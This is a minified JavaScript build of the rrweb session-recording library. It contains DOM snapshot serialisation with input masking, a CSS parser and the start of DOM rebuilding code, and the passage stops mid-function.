var rrweb = function (ee) {
    "use strict";
    var D;
    (function (t) {
        t[t.Document = 0] = "Document", t[t.DocumentType = 1] = "DocumentType", t[t.Element = 2] = "Element", t[t.Text = 3] = "Text", t[t.CDATA = 4] = "CDATA", t[t.Comment = 5] = "Comment"
    })(D || (D = {}));

    function Tt(t) {
        return t.nodeType === t.ELEMENT_NODE
    }

    function Oe(t) {
        var e = t?.host;
        return Boolean(e?.shadowRoot === t)
    }

    function Le(t) {
        return Object.prototype.toString.call(t) === "[object ShadowRoot]"
    }

    function Kn(t) {
        return t.includes(" background-clip: text;") && !t.includes(" -webkit-background-clip: text;") && (t = t.replace(" background-clip: text;", " -webkit-background-clip: text; background-clip: text;")), t
    }

    function Je(t) {
        try {
            var e = t.rules || t.cssRules;
            return e ? Kn(Array.from(e).map(Mt).join("")) : null
        } catch {
            return null
        }
    }

    function Mt(t) {
        var e = t.cssText;
        if (Qn(t)) try {
            e = Je(t.styleSheet) || e
        } catch {
        }
        return e
    }

    function Qn(t) {
        return "styleSheet" in t
    }

    var qe = function () {
        function t() {
            this.idNodeMap = new Map, this.nodeMetaMap = new WeakMap
        }

        return t.prototype.getId = function (e) {
            var n;
            if (!e) return -1;
            var r = (n = this.getMeta(e)) === null || n === void 0 ? void 0 : n.id;
            return r ?? -1
        }, t.prototype.getNode = function (e) {
            return this.idNodeMap.get(e) || null
        }, t.prototype.getIds = function () {
            return Array.from(this.idNodeMap.keys())
        }, t.prototype.getMeta = function (e) {
            return this.nodeMetaMap.get(e) || null
        }, t.prototype.removeNodeFromMap = function (e) {
            var n = this, r = this.getId(e);
            this.idNodeMap.delete(r), e.childNodes && e.childNodes.forEach(function (o) {
                return n.removeNodeFromMap(o)
            })
        }, t.prototype.has = function (e) {
            return this.idNodeMap.has(e)
        }, t.prototype.hasNode = function (e) {
            return this.nodeMetaMap.has(e)
        }, t.prototype.add = function (e, n) {
            var r = n.id;
            this.idNodeMap.set(r, e), this.nodeMetaMap.set(e, n)
        }, t.prototype.replace = function (e, n) {
            var r = this.getNode(e);
            if (r) {
                var o = this.nodeMetaMap.get(r);
                o && this.nodeMetaMap.set(n, o)
            }
            this.idNodeMap.set(e, n)
        }, t.prototype.reset = function () {
            this.idNodeMap = new Map, this.nodeMetaMap = new WeakMap
        }, t
    }();

    function kt() {
        return new qe
    }

    function et(t) {
        var e = t.maskInputOptions, n = t.tagName, r = t.type, o = t.value, a = t.maskInputFn, s = o || "";
        return (e[n.toLowerCase()] || e[r]) && (a ? s = a(s) : s = "*".repeat(s.length)), s
    }

    var Dt = "__rrweb_original__";

    function Jn(t) {
        var e = t.getContext("2d");
        if (!e) return !0;
        for (var n = 50, r = 0; r < t.width; r += n) for (var o = 0; o < t.height; o += n) {
            var a = e.getImageData, s = Dt in a ? a[Dt] : a,
                i = new Uint32Array(s.call(e, r, o, Math.min(n, t.width - r), Math.min(n, t.height - o)).data.buffer);
            if (i.some(function (l) {
                return l !== 0
            })) return !1
        }
        return !0
    }

    var qn = 1, er = new RegExp("[^a-z0-9-_:]"), Ae = -2;

    function Rt() {
        return qn++
    }

    function tr(t) {
        if (t instanceof HTMLFormElement) return "form";
        var e = t.tagName.toLowerCase().trim();
        return er.test(e) ? "div" : e
    }

    function nr(t) {
        return t.cssRules ? Array.from(t.cssRules).map(function (e) {
            return e.cssText || ""
        }).join("") : ""
    }

    function rr(t) {
        var e = "";
        return t.indexOf("//") > -1 ? e = t.split("/").slice(0, 3).join("/") : e = t.split("/")[0], e = e.split("?")[0], e
    }

    var we, xt, or = /url\((?:(')([^']*)'|(")(.*?)"|([^)]*))\)/gm,
        sr = /^(?!www\.|(?:http|ftp)s?:\/\/|[A-Za-z]:\\|\/\/|#).*/, ir = /^(data:)([^,]*),(.*)/i;

    function Ve(t, e) {
        return (t || "").replace(or, function (n, r, o, a, s, i) {
            var l = o || s || i, c = r || a || "";
            if (!l) return n;
            if (!sr.test(l) || ir.test(l)) return "url(".concat(c).concat(l).concat(c, ")");
            if (l[0] === "/") return "url(".concat(c).concat(rr(e) + l).concat(c, ")");
            var u = e.split("/"), d = l.split("/");
            u.pop();
            for (var h = 0, p = d; h < p.length; h++) {
                var m = p[h];
                m !== "." && (m === ".." ? u.pop() : u.push(m))
            }
            return "url(".concat(c).concat(u.join("/")).concat(c, ")")
        })
    }

    var ar = /^[^ \t\n\r\u000c]+/, lr = /^[, \t\n\r\u000c]+/;

    function cr(t, e) {
        if (e.trim() === "") return e;
        var n = 0;

        function r(c) {
            var u, d = c.exec(e.substring(n));
            return d ? (u = d[0], n += u.length, u) : ""
        }

        for (var o = []; r(lr), !(n >= e.length);) {
            var a = r(ar);
            if (a.slice(-1) === ",") a = Be(t, a.substring(0, a.length - 1)), o.push(a); else {
                var s = "";
                a = Be(t, a);
                for (var i = !1; ;) {
                    var l = e.charAt(n);
                    if (l === "") {
                        o.push((a + s).trim());
                        break
                    } else if (i) l === ")" && (i = !1); else if (l === ",") {
                        n += 1, o.push((a + s).trim());
                        break
                    } else l === "(" && (i = !0);
                    s += l, n += 1
                }
            }
        }
        return o.join(", ")
    }

    function Be(t, e) {
        if (!e || e.trim() === "") return e;
        var n = t.createElement("a");
        return n.href = e, n.href
    }

    function ur(t) {
        return Boolean(t.tagName === "svg" || t.ownerSVGElement)
    }

    function tt() {
        var t = document.createElement("a");
        return t.href = "", t.href
    }

    function Ot(t, e, n, r) {
        return n === "src" || n === "href" && r && !(e === "use" && r[0] === "#") || n === "xlink:href" && r && r[0] !== "#" || n === "background" && r && (e === "table" || e === "td" || e === "th") ? Be(t, r) : n === "srcset" && r ? cr(t, r) : n === "style" && r ? Ve(r, tt()) : e === "object" && n === "data" && r ? Be(t, r) : r
    }

    function dr(t, e, n) {
        if (typeof e == "string") {
            if (t.classList.contains(e)) return !0
        } else for (var r = t.classList.length; r--;) {
            var o = t.classList[r];
            if (e.test(o)) return !0
        }
        return n ? t.matches(n) : !1
    }

    function Ge(t, e, n) {
        if (!t) return !1;
        if (t.nodeType !== t.ELEMENT_NODE) return n ? Ge(t.parentNode, e, n) : !1;
        for (var r = t.classList.length; r--;) {
            var o = t.classList[r];
            if (e.test(o)) return !0
        }
        return n ? Ge(t.parentNode, e, n) : !1
    }

    function Lt(t, e, n) {
        var r = t.nodeType === t.ELEMENT_NODE ? t : t.parentElement;
        if (r === null) return !1;
        if (typeof e == "string") {
            if (r.classList.contains(e) || r.closest(".".concat(e))) return !0
        } else if (Ge(r, e, !0)) return !0;
        return !!(n && (r.matches(n) || r.closest(n)))
    }

    function hr(t, e, n) {
        var r = t.contentWindow;
        if (r) {
            var o = !1, a;
            try {
                a = r.document.readyState
            } catch {
                return
            }
            if (a !== "complete") {
                var s = setTimeout(function () {
                    o || (e(), o = !0)
                }, n);
                t.addEventListener("load", function () {
                    clearTimeout(s), o = !0, e()
                });
                return
            }
            var i = "about:blank";
            if (r.location.href !== i || t.src === i || t.src === "") return setTimeout(e, 0), t.addEventListener("load", e);
            t.addEventListener("load", e)
        }
    }

    function pr(t, e, n) {
        var r = !1, o;
        try {
            o = t.sheet
        } catch {
            return
        }
        if (!o) {
            var a = setTimeout(function () {
                r || (e(), r = !0)
            }, n);
            t.addEventListener("load", function () {
                clearTimeout(a), r = !0, e()
            })
        }
    }

    function mr(t, e) {
        var n = e.doc, r = e.mirror, o = e.blockClass, a = e.blockSelector, s = e.maskTextClass, i = e.maskTextSelector,
            l = e.inlineStylesheet, c = e.maskInputOptions, u = c === void 0 ? {} : c, d = e.maskTextFn,
            h = e.maskInputFn, p = e.dataURLOptions, m = p === void 0 ? {} : p, b = e.inlineImages, S = e.recordCanvas,
            f = e.keepIframeSrcFn, y = e.newlyAddedElement, g = y === void 0 ? !1 : y, E = fr(n, r);
        switch (t.nodeType) {
            case t.DOCUMENT_NODE:
                return t.compatMode !== "CSS1Compat" ? {
                    type: D.Document,
                    childNodes: [],
                    compatMode: t.compatMode
                } : {type: D.Document, childNodes: []};
            case t.DOCUMENT_TYPE_NODE:
                return {type: D.DocumentType, name: t.name, publicId: t.publicId, systemId: t.systemId, rootId: E};
            case t.ELEMENT_NODE:
                return gr(t, {
                    doc: n,
                    blockClass: o,
                    blockSelector: a,
                    inlineStylesheet: l,
                    maskInputOptions: u,
                    maskInputFn: h,
                    dataURLOptions: m,
                    inlineImages: b,
                    recordCanvas: S,
                    keepIframeSrcFn: f,
                    newlyAddedElement: g,
                    rootId: E
                });
            case t.TEXT_NODE:
                return yr(t, {maskTextClass: s, maskTextSelector: i, maskTextFn: d, rootId: E});
            case t.CDATA_SECTION_NODE:
                return {type: D.CDATA, textContent: "", rootId: E};
            case t.COMMENT_NODE:
                return {type: D.Comment, textContent: t.textContent || "", rootId: E};
            default:
                return !1
        }
    }

    function fr(t, e) {
        if (e.hasNode(t)) {
            var n = e.getId(t);
            return n === 1 ? void 0 : n
        }
    }

    function yr(t, e) {
        var n, r = e.maskTextClass, o = e.maskTextSelector, a = e.maskTextFn, s = e.rootId,
            i = t.parentNode && t.parentNode.tagName, l = t.textContent, c = i === "STYLE" ? !0 : void 0,
            u = i === "SCRIPT" ? !0 : void 0;
        if (c && l) {
            try {
                t.nextSibling || t.previousSibling || !((n = t.parentNode.sheet) === null || n === void 0) && n.cssRules && (l = nr(t.parentNode.sheet))
            } catch (d) {
                console.warn("Cannot get CSS styles from text's parentNode. Error: ".concat(d), t)
            }
            l = Ve(l, tt())
        }
        return u && (l = "SCRIPT_PLACEHOLDER"), !c && !u && l && Lt(t, r, o) && (l = a ? a(l) : l.replace(/[\S]/g, "*")), {
            type: D.Text,
            textContent: l || "",
            isStyle: c,
            rootId: s
        }
    }

    function gr(t, e) {
        for (var n = e.doc, r = e.blockClass, o = e.blockSelector, a = e.inlineStylesheet, s = e.maskInputOptions, i = s === void 0 ? {} : s, l = e.maskInputFn, c = e.dataURLOptions, u = c === void 0 ? {} : c, d = e.inlineImages, h = e.recordCanvas, p = e.keepIframeSrcFn, m = e.newlyAddedElement, b = m === void 0 ? !1 : m, S = e.rootId, f = dr(t, r, o), y = tr(t), g = {}, E = t.attributes.length, k = 0; k < E; k++) {
            var x = t.attributes[k];
            g[x.name] = Ot(n, y, x.name, x.value)
        }
        if (y === "link" && a) {
            var F = Array.from(n.styleSheets).find(function (v) {
                return v.href === t.href
            }), _ = null;
            F && (_ = Je(F)), _ && (delete g.rel, delete g.href, g._cssText = Ve(_, F.href))
        }
        if (y === "style" && t.sheet && !(t.innerText || t.textContent || "").trim().length) {
            var _ = Je(t.sheet);
            _ && (g._cssText = Ve(_, tt()))
        }
        if (y === "input" || y === "textarea" || y === "select") {
            var J = t.value, Y = t.checked;
            g.type !== "radio" && g.type !== "checkbox" && g.type !== "submit" && g.type !== "button" && J ? g.value = et({
                type: g.type,
                tagName: y,
                value: J,
                maskInputOptions: i,
                maskInputFn: l
            }) : Y && (g.checked = Y)
        }
        if (y === "option" && (t.selected && !i.select ? g.selected = !0 : delete g.selected), y === "canvas" && h) {
            if (t.__context === "2d") Jn(t) || (g.rr_dataURL = t.toDataURL(u.type, u.quality)); else if (!("__context" in t)) {
                var q = t.toDataURL(u.type, u.quality), z = document.createElement("canvas");
                z.width = t.width, z.height = t.height;
                var X = z.toDataURL(u.type, u.quality);
                q !== X && (g.rr_dataURL = q)
            }
        }
        if (y === "img" && d) {
            we || (we = n.createElement("canvas"), xt = we.getContext("2d"));
            var $ = t, Z = $.crossOrigin;
            $.crossOrigin = "anonymous";
            var H = function () {
                try {
                    we.width = $.naturalWidth, we.height = $.naturalHeight, xt.drawImage($, 0, 0), g.rr_dataURL = we.toDataURL(u.type, u.quality)
                } catch (v) {
                    console.warn("Cannot inline img src=".concat($.currentSrc, "! Error: ").concat(v))
                }
                Z ? g.crossOrigin = Z : $.removeAttribute("crossorigin")
            };
            $.complete && $.naturalWidth !== 0 ? H() : $.onload = H
        }
        if ((y === "audio" || y === "video") && (g.rr_mediaState = t.paused ? "paused" : "played", g.rr_mediaCurrentTime = t.currentTime), b || (t.scrollLeft && (g.rr_scrollLeft = t.scrollLeft), t.scrollTop && (g.rr_scrollTop = t.scrollTop)), f) {
            var L = t.getBoundingClientRect(), te = L.width, w = L.height;
            g = {class: g.class, rr_width: "".concat(te, "px"), rr_height: "".concat(w, "px")}
        }
        return y === "iframe" && !p(g.src) && (t.contentDocument || (g.rr_src = g.src), delete g.src), {
            type: D.Element,
            tagName: y,
            attributes: g,
            childNodes: [],
            isSVG: ur(t) || void 0,
            needBlock: f,
            rootId: S
        }
    }

    function P(t) {
        return t === void 0 ? "" : t.toLowerCase()
    }

    function vr(t, e) {
        return !!(e.comment && t.type === D.Comment || t.type === D.Element && (e.script && (t.tagName === "script" || t.tagName === "link" && t.attributes.rel === "preload" && t.attributes.as === "script" || t.tagName === "link" && t.attributes.rel === "prefetch" && typeof t.attributes.href == "string" && t.attributes.href.endsWith(".js")) || e.headFavicon && (t.tagName === "link" && t.attributes.rel === "shortcut icon" || t.tagName === "meta" && (P(t.attributes.name).match(/^msapplication-tile(image|color)$/) || P(t.attributes.name) === "application-name" || P(t.attributes.rel) === "icon" || P(t.attributes.rel) === "apple-touch-icon" || P(t.attributes.rel) === "shortcut icon")) || t.tagName === "meta" && (e.headMetaDescKeywords && P(t.attributes.name).match(/^description|keywords$/) || e.headMetaSocial && (P(t.attributes.property).match(/^(og|twitter|fb):/) || P(t.attributes.name).match(/^(og|twitter):/) || P(t.attributes.name) === "pinterest") || e.headMetaRobots && (P(t.attributes.name) === "robots" || P(t.attributes.name) === "googlebot" || P(t.attributes.name) === "bingbot") || e.headMetaHttpEquiv && t.attributes["http-equiv"] !== void 0 || e.headMetaAuthorship && (P(t.attributes.name) === "author" || P(t.attributes.name) === "generator" || P(t.attributes.name) === "framework" || P(t.attributes.name) === "publisher" || P(t.attributes.name) === "progid" || P(t.attributes.property).match(/^article:/) || P(t.attributes.property).match(/^product:/)) || e.headMetaVerification && (P(t.attributes.name) === "google-site-verification" || P(t.attributes.name) === "yandex-verification" || P(t.attributes.name) === "csrf-token" || P(t.attributes.name) === "p:domain_verify" || P(t.attributes.name) === "verify-v1" || P(t.attributes.name) === "verification" || P(t.attributes.name) === "shopify-checkout-api-token"))))
    }

    function Ee(t, e) {
        var n = e.doc, r = e.mirror, o = e.blockClass, a = e.blockSelector, s = e.maskTextClass, i = e.maskTextSelector,
            l = e.skipChild, c = l === void 0 ? !1 : l, u = e.inlineStylesheet, d = u === void 0 ? !0 : u,
            h = e.maskInputOptions, p = h === void 0 ? {} : h, m = e.maskTextFn, b = e.maskInputFn,
            S = e.slimDOMOptions, f = e.dataURLOptions, y = f === void 0 ? {} : f, g = e.inlineImages,
            E = g === void 0 ? !1 : g, k = e.recordCanvas, x = k === void 0 ? !1 : k, F = e.onSerialize,
            _ = e.onIframeLoad, J = e.iframeLoadTimeout, Y = J === void 0 ? 5e3 : J, q = e.onStylesheetLoad,
            z = e.stylesheetLoadTimeout, X = z === void 0 ? 5e3 : z, $ = e.keepIframeSrcFn,
            Z = $ === void 0 ? function () {
                return !1
            } : $, H = e.newlyAddedElement, L = H === void 0 ? !1 : H, te = e.preserveWhiteSpace,
            w = te === void 0 ? !0 : te, v = mr(t, {
                doc: n,
                mirror: r,
                blockClass: o,
                blockSelector: a,
                maskTextClass: s,
                maskTextSelector: i,
                inlineStylesheet: d,
                maskInputOptions: p,
                maskTextFn: m,
                maskInputFn: b,
                dataURLOptions: y,
                inlineImages: E,
                recordCanvas: x,
                keepIframeSrcFn: Z,
                newlyAddedElement: L
            });
        if (!v) return console.warn(t, "not serialized"), null;
        var M;
        r.hasNode(t) ? M = r.getId(t) : vr(v, S) || !w && v.type === D.Text && !v.isStyle && !v.textContent.replace(/^\s+|\s+$/gm, "").length ? M = Ae : M = Rt();
        var T = Object.assign(v, {id: M});
        if (r.add(t, T), M === Ae) return null;
        F && F(t);
        var W = !c;
        if (T.type === D.Element) {
            W = W && !T.needBlock, delete T.needBlock;
            var ne = t.shadowRoot;
            ne && Le(ne) && (T.isShadowHost = !0)
        }
        if ((T.type === D.Document || T.type === D.Element) && W) {
            S.headWhitespace && T.type === D.Element && T.tagName === "head" && (w = !1);
            for (var xe = {
                doc: n,
                mirror: r,
                blockClass: o,
                blockSelector: a,
                maskTextClass: s,
                maskTextSelector: i,
                skipChild: c,
                inlineStylesheet: d,
                maskInputOptions: p,
                maskTextFn: m,
                maskInputFn: b,
                slimDOMOptions: S,
                dataURLOptions: y,
                inlineImages: E,
                recordCanvas: x,
                preserveWhiteSpace: w,
                onSerialize: F,
                onIframeLoad: _,
                iframeLoadTimeout: Y,
                onStylesheetLoad: q,
                stylesheetLoadTimeout: X,
                keepIframeSrcFn: Z
            }, I = 0, oe = Array.from(t.childNodes); I < oe.length; I++) {
                var ae = oe[I], B = Ee(ae, xe);
                B && T.childNodes.push(B)
            }
            if (Tt(t) && t.shadowRoot) for (var ue = 0, A = Array.from(t.shadowRoot.childNodes); ue < A.length; ue++) {
                var ae = A[ue], B = Ee(ae, xe);
                B && (Le(t.shadowRoot) && (B.isShadow = !0), T.childNodes.push(B))
            }
        }
        return t.parentNode && Oe(t.parentNode) && Le(t.parentNode) && (T.isShadow = !0), T.type === D.Element && T.tagName === "iframe" && hr(t, function () {
            var ie = t.contentDocument;
            if (ie && _) {
                var Ue = Ee(ie, {
                    doc: ie,
                    mirror: r,
                    blockClass: o,
                    blockSelector: a,
                    maskTextClass: s,
                    maskTextSelector: i,
                    skipChild: !1,
                    inlineStylesheet: d,
                    maskInputOptions: p,
                    maskTextFn: m,
                    maskInputFn: b,
                    slimDOMOptions: S,
                    dataURLOptions: y,
                    inlineImages: E,
                    recordCanvas: x,
                    preserveWhiteSpace: w,
                    onSerialize: F,
                    onIframeLoad: _,
                    iframeLoadTimeout: Y,
                    onStylesheetLoad: q,
                    stylesheetLoadTimeout: X,
                    keepIframeSrcFn: Z
                });
                Ue && _(t, Ue)
            }
        }, Y), T.type === D.Element && T.tagName === "link" && T.attributes.rel === "stylesheet" && pr(t, function () {
            if (q) {
                var ie = Ee(t, {
                    doc: n,
                    mirror: r,
                    blockClass: o,
                    blockSelector: a,
                    maskTextClass: s,
                    maskTextSelector: i,
                    skipChild: !1,
                    inlineStylesheet: d,
                    maskInputOptions: p,
                    maskTextFn: m,
                    maskInputFn: b,
                    slimDOMOptions: S,
                    dataURLOptions: y,
                    inlineImages: E,
                    recordCanvas: x,
                    preserveWhiteSpace: w,
                    onSerialize: F,
                    onIframeLoad: _,
                    iframeLoadTimeout: Y,
                    onStylesheetLoad: q,
                    stylesheetLoadTimeout: X,
                    keepIframeSrcFn: Z
                });
                ie && q(t, ie)
            }
        }, X), T
    }

    function Sr(t, e) {
        var n = e || {}, r = n.mirror, o = r === void 0 ? new qe : r, a = n.blockClass,
            s = a === void 0 ? "rr-block" : a, i = n.blockSelector, l = i === void 0 ? null : i, c = n.maskTextClass,
            u = c === void 0 ? "rr-mask" : c, d = n.maskTextSelector, h = d === void 0 ? null : d,
            p = n.inlineStylesheet, m = p === void 0 ? !0 : p, b = n.inlineImages, S = b === void 0 ? !1 : b,
            f = n.recordCanvas, y = f === void 0 ? !1 : f, g = n.maskAllInputs, E = g === void 0 ? !1 : g,
            k = n.maskTextFn, x = n.maskInputFn, F = n.slimDOM, _ = F === void 0 ? !1 : F, J = n.dataURLOptions,
            Y = n.preserveWhiteSpace, q = n.onSerialize, z = n.onIframeLoad, X = n.iframeLoadTimeout,
            $ = n.onStylesheetLoad, Z = n.stylesheetLoadTimeout, H = n.keepIframeSrcFn, L = H === void 0 ? function () {
                return !1
            } : H, te = E === !0 ? {
                color: !0,
                date: !0,
                "datetime-local": !0,
                email: !0,
                month: !0,
                number: !0,
                range: !0,
                search: !0,
                tel: !0,
                text: !0,
                time: !0,
                url: !0,
                week: !0,
                textarea: !0,
                select: !0,
                password: !0
            } : E === !1 ? {password: !0} : E, w = _ === !0 || _ === "all" ? {
                script: !0,
                comment: !0,
                headFavicon: !0,
                headWhitespace: !0,
                headMetaDescKeywords: _ === "all",
                headMetaSocial: !0,
                headMetaRobots: !0,
                headMetaHttpEquiv: !0,
                headMetaAuthorship: !0,
                headMetaVerification: !0
            } : _ === !1 ? {} : _;
        return Ee(t, {
            doc: t,
            mirror: o,
            blockClass: s,
            blockSelector: l,
            maskTextClass: u,
            maskTextSelector: h,
            skipChild: !1,
            inlineStylesheet: m,
            maskInputOptions: te,
            maskTextFn: k,
            maskInputFn: x,
            slimDOMOptions: w,
            dataURLOptions: J,
            inlineImages: S,
            recordCanvas: y,
            preserveWhiteSpace: Y,
            onSerialize: q,
            onIframeLoad: z,
            iframeLoadTimeout: X,
            onStylesheetLoad: $,
            stylesheetLoadTimeout: Z,
            keepIframeSrcFn: L,
            newlyAddedElement: !1
        })
    }

    var At = /\/\*[^*]*\*+([^/*][^*]*\*+)*\//g;

    function br(t, e) {
        e === void 0 && (e = {});
        var n = 1, r = 1;

        function o(w) {
            var v = w.match(/\n/g);
            v && (n += v.length);
            var M = w.lastIndexOf(`
`);
            r = M === -1 ? r + w.length : w.length - M
        }

        function a() {
            var w = {line: n, column: r};
            return function (v) {
                return v.position = new s(w), m(), v
            }
        }

        var s = function () {
            function w(v) {
                this.start = v, this.end = {line: n, column: r}, this.source = e.source
            }

            return w
        }();
        s.prototype.content = t;
        var i = [];

        function l(w) {
            var v = new Error("".concat(e.source || "", ":").concat(n, ":").concat(r, ": ").concat(w));
            if (v.reason = w, v.filename = e.source, v.line = n, v.column = r, v.source = t, e.silent) i.push(v); else throw v
        }

        function c() {
            var w = h();
            return {type: "stylesheet", stylesheet: {source: e.source, rules: w, parsingErrors: i}}
        }

        function u() {
            return p(/^{\s*/)
        }

        function d() {
            return p(/^}/)
        }

        function h() {
            var w, v = [];
            for (m(), b(v); t.length && t.charAt(0) !== "}" && (w = L() || te());) w !== !1 && (v.push(w), b(v));
            return v
        }

        function p(w) {
            var v = w.exec(t);
            if (v) {
                var M = v[0];
                return o(M), t = t.slice(M.length), v
            }
        }

        function m() {
            p(/^\s*/)
        }

        function b(w) {
            w === void 0 && (w = []);
            for (var v; v = S();) v !== !1 && w.push(v), v = S();
            return w
        }

        function S() {
            var w = a();
            if (!(t.charAt(0) !== "/" || t.charAt(1) !== "*")) {
                for (var v = 2; t.charAt(v) !== "" && (t.charAt(v) !== "*" || t.charAt(v + 1) !== "/");) ++v;
                if (v += 2, t.charAt(v - 1) === "") return l("End of comment missing");
                var M = t.slice(2, v - 2);
                return r += 2, o(M), t = t.slice(v), r += 2, w({type: "comment", comment: M})
            }
        }

        function f() {
            var w = p(/^([^{]+)/);
            if (w) return he(w[0]).replace(/\/\*([^*]|[\r\n]|(\*+([^*/]|[\r\n])))*\*\/+/g, "").replace(/"(?:\\"|[^"])*"|'(?:\\'|[^'])*'/g, function (v) {
                return v.replace(/,/g, "\u200C")
            }).split(/\s*(?![^(]*\)),\s*/).map(function (v) {
                return v.replace(/\u200C/g, ",")
            })
        }

        function y() {
            var w = a(), v = p(/^(\*?[-#\/\*\\\w]+(\[[0-9a-z_-]+\])?)\s*/);
            if (v) {
                var M = he(v[0]);
                if (!p(/^:\s*/)) return l("property missing ':'");
                var T = p(/^((?:'(?:\\'|.)*?'|"(?:\\"|.)*?"|\([^\)]*?\)|[^};])+)/),
                    W = w({type: "declaration", property: M.replace(At, ""), value: T ? he(T[0]).replace(At, "") : ""});
                return p(/^[;\s]*/), W
            }
        }

        function g() {
            var w = [];
            if (!u()) return l("missing '{'");
            b(w);
            for (var v; v = y();) v !== !1 && (w.push(v), b(w)), v = y();
            return d() ? w : l("missing '}'")
        }

        function E() {
            for (var w, v = [], M = a(); w = p(/^((\d+\.\d+|\.\d+|\d+)%?|[a-z]+)\s*/);) v.push(w[1]), p(/^,\s*/);
            if (v.length) return M({type: "keyframe", values: v, declarations: g()})
        }

        function k() {
            var w = a(), v = p(/^@([-\w]+)?keyframes\s*/);
            if (v) {
                var M = v[1];
                if (v = p(/^([-\w]+)\s*/), !v) return l("@keyframes missing name");
                var T = v[1];
                if (!u()) return l("@keyframes missing '{'");
                for (var W, ne = b(); W = E();) ne.push(W), ne = ne.concat(b());
                return d() ? w({type: "keyframes", name: T, vendor: M, keyframes: ne}) : l("@keyframes missing '}'")
            }
        }

        function x() {
            var w = a(), v = p(/^@supports *([^{]+)/);
            if (v) {
                var M = he(v[1]);
                if (!u()) return l("@supports missing '{'");
                var T = b().concat(h());
                return d() ? w({type: "supports", supports: M, rules: T}) : l("@supports missing '}'")
            }
        }

        function F() {
            var w = a(), v = p(/^@host\s*/);
            if (v) {
                if (!u()) return l("@host missing '{'");
                var M = b().concat(h());
                return d() ? w({type: "host", rules: M}) : l("@host missing '}'")
            }
        }

        function _() {
            var w = a(), v = p(/^@media *([^{]+)/);
            if (v) {
                var M = he(v[1]);
                if (!u()) return l("@media missing '{'");
                var T = b().concat(h());
                return d() ? w({type: "media", media: M, rules: T}) : l("@media missing '}'")
            }
        }

        function J() {
            var w = a(), v = p(/^@custom-media\s+(--[^\s]+)\s*([^{;]+);/);
            if (v) return w({type: "custom-media", name: he(v[1]), media: he(v[2])})
        }

        function Y() {
            var w = a(), v = p(/^@page */);
            if (v) {
                var M = f() || [];
                if (!u()) return l("@page missing '{'");
                for (var T = b(), W; W = y();) T.push(W), T = T.concat(b());
                return d() ? w({type: "page", selectors: M, declarations: T}) : l("@page missing '}'")
            }
        }

        function q() {
            var w = a(), v = p(/^@([-\w]+)?document *([^{]+)/);
            if (v) {
                var M = he(v[1]), T = he(v[2]);
                if (!u()) return l("@document missing '{'");
                var W = b().concat(h());
                return d() ? w({type: "document", document: T, vendor: M, rules: W}) : l("@document missing '}'")
            }
        }

        function z() {
            var w = a(), v = p(/^@font-face\s*/);
            if (v) {
                if (!u()) return l("@font-face missing '{'");
                for (var M = b(), T; T = y();) M.push(T), M = M.concat(b());
                return d() ? w({type: "font-face", declarations: M}) : l("@font-face missing '}'")
            }
        }

        var X = H("import"), $ = H("charset"), Z = H("namespace");

        function H(w) {
            var v = new RegExp("^@" + w + "\\s*([^;]+);");
            return function () {
                var M = a(), T = p(v);
                if (T) {
                    var W = {type: w};
                    return W[w] = T[1].trim(), M(W)
                }
            }
        }

        function L() {
            if (t[0] === "@") return k() || _() || J() || x() || X() || $() || Z() || q() || Y() || F() || z()
        }

        function te() {
            var w = a(), v = f();
            return v ? (b(), w({type: "rule", selectors: v, declarations: g()})) : l("selector missing")
        }

        return nt(c())
    }

    function he(t) {
        return t ? t.replace(/^\s+|\s+$/g, "") : ""
    }

    function nt(t, e) {
        for (var n = t && typeof t.type == "string", r = n ? t : e, o = 0, a = Object.keys(t); o < a.length; o++) {
            var s = a[o], i = t[s];
            Array.isArray(i) ? i.forEach(function (l) {
                nt(l, r)
            }) : i && typeof i == "object" && nt(i, r)
        }
        return n && Object.defineProperty(t, "parent", {
            configurable: !0,
            writable: !0,
            enumerable: !1,
            value: e || null
        }), t
    }

    var _t = {
        script: "noscript",
        altglyph: "altGlyph",
        altglyphdef: "altGlyphDef",
        altglyphitem: "altGlyphItem",
        animatecolor: "animateColor",
        animatemotion: "animateMotion",
        animatetransform: "animateTransform",
        clippath: "clipPath",
        feblend: "feBlend",
        fecolormatrix: "feColorMatrix",
        fecomponenttransfer: "feComponentTransfer",
        fecomposite: "feComposite",
        feconvolvematrix: "feConvolveMatrix",
        fediffuselighting: "feDiffuseLighting",
        fedisplacementmap: "feDisplacementMap",
        fedistantlight: "feDistantLight",
        fedropshadow: "feDropShadow",
        feflood: "feFlood",
        fefunca: "feFuncA",
        fefuncb: "feFuncB",
        fefuncg: "feFuncG",
        fefuncr: "feFuncR",
        fegaussianblur: "feGaussianBlur",
        feimage: "feImage",
        femerge: "feMerge",
        femergenode: "feMergeNode",
        femorphology: "feMorphology",
        feoffset: "feOffset",
        fepointlight: "fePointLight",
        fespecularlighting: "feSpecularLighting",
        fespotlight: "feSpotLight",
        fetile: "feTile",
        feturbulence: "feTurbulence",
        foreignobject: "foreignObject",
        glyphref: "glyphRef",
        lineargradient: "linearGradient",
        radialgradient: "radialGradient"
    };

    function wr(t) {
        var e = _t[t.tagName] ? _t[t.tagName] : t.tagName;
        return e === "link" && t.attributes._cssText && (e = "style"), e
    }

    function Er(t) {
        return t.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")
    }

    var Ft = /([^\\]):hover/, Nr = new RegExp(Ft.source, "g");

    function Pt(t, e) {
        var n = e?.stylesWithHoverClass.get(t);
        if (n) return n;
        var r = br(t, {silent: !0});
        if (!r.stylesheet) return t;
        var o = [];
        if (r.stylesheet.rules.forEach(function (i) {
            "selectors" in i && (i.selectors || []).forEach(function (l) {
                Ft.test(l) && o.push(l)
            })
        }), o.length === 0) return t;
        var a = new RegExp(o.filter(function (i, l) {
            return o.indexOf(i) === l
        }).sort(function (i, l) {
            return l.length - i.length
        }).map(function (i) {
            return Er(i)
        }).join("|"), "g"), s = t.replace(a, function (i) {
            var l = i.replace(Nr, "$1.\\:hover");
            return "".concat(i, ", ").concat(l)
        });
        return e?.stylesWithHoverClass.set(t, s), s
    }

    function Wt() {
        var t = new Map;
        return {stylesWithHoverClass: t}
    }

    function Cr(t, e) {
        var n = e.doc, r = e.hackCss, o = e.cache;
        switch (t.type) {
            case D.Document:
                return n.implementation.createDocument(null, "", null);
            case D.DocumentType:
                return n.implementation.createDocumentType(t.name || "html", t.publicId, t.systemId);
            case D.Element: {
                var a = wr(t), s;
                t.isSVG ? s = n.createElementNS("http://www.w3.org/2000/svg", a) : s = n.createElement(a);
                var i = {};
                for (var l in t.attributes) if (Object.prototype.hasOwnProperty.call(t.attributes, l)) {
                    var c = t.attributes[l];
